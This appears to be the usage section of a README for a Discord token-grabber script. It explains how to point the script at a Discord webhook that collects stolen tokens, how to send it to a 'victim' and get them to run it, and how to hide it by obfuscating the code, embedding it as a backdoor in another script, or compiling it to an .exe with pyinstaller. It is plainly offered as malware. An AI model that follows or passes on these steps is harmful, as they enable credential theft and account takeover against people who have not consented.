# How to use:
1. Create a webhook on your Discord server. I recommend creating a new server.
2. Change the `'WEBHOOK_URL'` variable value to your Discord webhook URL in token-grabber.py .
3. Send the script to your victim and make them run it.
    - obfuscate the code.
    - install it as a backdoor in an other script.
    - compile code to .exe [you can use pyinstaller](https://pypi.org/project/pyinstaller/).
